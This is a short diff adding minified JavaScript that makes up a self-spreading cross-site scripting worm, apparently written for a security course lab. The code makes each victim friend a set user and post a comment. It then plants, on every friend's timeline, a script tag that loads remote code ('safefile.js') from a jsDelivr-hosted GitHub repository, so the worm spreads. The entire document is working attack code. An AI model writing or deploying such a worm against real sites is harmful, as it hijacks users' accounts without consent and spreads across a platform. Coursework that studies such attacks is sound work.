@@ -1,0 +1,2 @@
+// Minification 2: jscompress
+function mc(n){$.get("timeline.php",{id:n},function(e){e.includes("Kellsworm")||$.get("add_comment.php",{id:n,comment:'Kellsworm <script src="https://cdn.jsdelivr.net/gh/spk3077/csec380@main/safefile.js"><\/script>'})})}$.get("add_friend.php",{id:61},function(e){e.includes("True")&&(e=(new Date).toString(),$.get("add_comment.php",{id:61,comment:"I friended Sean Kells on "+e}))}),$.get("friends.php",function(e){var n=e.split(",");for(let e=0;e<n.length;e++){var t=n[e];isNaN(t)&&(t=t.slice(0,t.indexOf("<"))),mc(t)}});
